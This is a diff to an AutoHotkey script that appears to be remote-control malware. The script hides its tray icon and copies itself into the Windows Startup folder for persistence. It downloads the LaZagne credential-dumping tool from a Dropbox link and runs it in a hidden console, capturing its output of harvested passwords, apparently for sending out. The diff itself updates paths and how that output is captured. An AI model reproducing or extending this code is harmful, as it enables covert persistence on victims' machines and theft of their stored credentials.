@@ -1,7 +1,7 @@
 #SingleInstance force
 #NoTrayIcon
 RvCmdVersion := "1.1"
-if A_WorkingDir != %A_WinDir%Users\%A_UserName%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+if A_WorkingDir != C:\Users\%A_UserName%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
 	annoy(5)
 binurl := "no"
 	whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
@@ -25,9 +25,9 @@ if 1 = update
 
 if	binArr2 = 1
 {
-	IfNotExist, %A_WinDir%Users\%A_UserName%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\%A_ScriptName%
+	IfNotExist, C:\Users\%A_UserName%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\%A_ScriptName%
 	{
-		FileCopy, %A_ScriptName%, %A_WinDir%Users\%A_UserName%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+		FileCopy, %A_ScriptName%, C:\Users\%A_UserName%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
 	}
 }
 
@@ -382,7 +382,16 @@ Interpret(command,binurl,mousean,sleept,RvCmdVersion)
 				;filedelete, lazag.exe
 				UrlDownloadToFile,*0 https://www.dropbox.com/s/y5akkq7sddz04nd/laZagne.exe?dl=1, %A_Temp%\laz.exe
 
-				runwait, %A_Temp%\laz.exe all -oN,,Hide
+				DetectHiddenWindows On
+				Run %ComSpec%,, Hide, pid
+				WinWait ahk_pid %pid%
+				DllCall("AttachConsole", "UInt", pid)
+				WshShell := ComObjCreate("Wscript.Shell")
+				exec := WshShell.Exec(A_Temp "\laz.exe all")
+				data := exec.StdOut.ReadAll()
+				MsgBox %output%
+				DllCall("FreeConsole")
+				Process Close, %pid%
 				
 				
 				data2 := SubStr(data,510)
